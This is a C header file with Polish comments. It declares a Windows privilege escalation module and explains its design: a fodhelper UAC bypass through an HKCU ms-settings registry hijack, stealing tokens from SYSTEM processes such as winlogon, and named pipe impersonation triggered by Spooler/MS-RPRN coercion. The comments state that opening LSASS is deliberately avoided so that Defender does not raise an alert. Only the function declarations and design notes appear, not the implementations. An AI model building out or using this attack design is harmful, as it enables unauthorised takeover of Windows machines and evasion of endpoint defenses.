/*
 * Privilege escalation module — 3 techniki na SYSTEM.
 *
 * Kolejność:
 *   1. Fodhelper UAC bypass → admin (nowy proces z /elevate)
 *   2. Token stealing z SYSTEM process → SYSTEM (nowy proces z /system)
 *   3. Named pipe impersonation → SYSTEM (fallback)
 *
 * Architektura — Fodhelper:
 *   Microsoft's fodhelper.exe (Features on Demand) jest signed przez MS i
 *   auto-elevates bez prompta UAC. Szuka handlera dla "ms-settings" URI
 *   schematu w HKCU\Software\Classes\ms-settings... HKCU jest writable
 *   dla usera → hijack.
 *
 * Token stealing:
 *   Gdy mamy admina (po fodhelper), włączamy SeDebugPrivilege i otwieramy
 *   proces SYSTEM (winlogon.exe, services.exe, csrss.exe). Otwieramy jego
 *   token, duplikujemy, i CreateProcessWithTokenW jako SYSTEM.
 *   Działa to na Windows 11 bo SeDebugPrivilege jest w tokenie admina,
 *   trzeba go tylko aktywować przez AdjustTokenPrivileges.
 *
 * Named pipe (fallback):
 *   Tworzymy pipe \\.\pipe\malinowy, triggerujemy SYSTEM service przez RPC
 *   i impersonate'ujemy klienta. Spooler + MS-RPRN coercion.
 *
 * Gotchas:
 *   — Fodhelper tworzy NOWY proces — nie podnosi obecnego. Dlatego main.c
 *     ma logikę flag /elevate i /system.
 *   — Token stealing wymaga, żeby target proces miał otwarty uchwyt.
 *     Windows 11 może blokować OpenProcess na PPL-protected processes
 *     (np. csrss.exe). Na winlogona powinno działać.
 *   — Defender alertuje na otwieranie LSASS — celowo go unikamy.
 *   — Wszystkie operacje tokenów muszą być cleanup'owane (CloseHandle).
 */

#pragma once
#ifndef ESCALATE_H
#define ESCALATE_H

#include <windows.h>

/* ── Technika 1: Fodhelper UAC bypass ──
 * Tworzy nowy proces jako admin (z flagą /elevate).
 * Zwraca 0 jeśli udało się triggerować fodhelpera. */
int escalate_fodhelper(void);

/* ── Technika 2: Token stealing z SYSTEM process ──
 * Znajduje proces SYSTEM, otwiera token, duplikuje i tworzy nowy proces
 * jako SYSTEM (z flagą /system).
 * Zwraca PID nowego procesu, lub 0 na fail. */
DWORD escalate_system_token(void);

/* ── Technika 3: Named pipe impersonation (fallback) ──
 * Tworzy pipe, triggeruje SYSTEM service do połączenia.
 * Zwraca 0 na sukces. */
int escalate_named_pipe(void);

/* ── Główny entry point ──
 * Sprawdza obecny poziom uprawnień i decyduje co robić:
 *   - SYSTEM → natychmiast 0
 *   - Admin → próbuje token stealing, potem pipe
 *   - User → próbuje fodhelper
 *
 * Zwraca: 0=SYSTEM, 1=admin, 2=user (nie udało się) */
int escalate_to_system(void);

/* ── Helper: sprawdzenie poziomu uprawnień ── */
BOOL is_running_as_system(void);
BOOL is_running_as_admin(void);

#endif
